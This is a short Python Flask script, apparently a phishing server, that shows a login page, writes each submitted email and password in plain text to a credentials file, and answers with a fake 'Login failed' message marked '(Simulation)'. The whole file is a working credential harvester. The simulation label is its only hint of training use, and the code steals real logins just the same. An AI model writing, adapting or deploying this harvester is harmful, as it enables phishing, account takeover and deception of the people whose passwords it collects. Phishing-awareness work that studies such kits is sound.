from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        with open("phishing_server/creds.txt", "a") as f:
            f.write(f"Email: {email} | Password: {password}\n")
        return "Login failed. Try again later. (Simulation)"
    return render_template("login.html")

if __name__ == "__main__":
    app.run(port=5000)

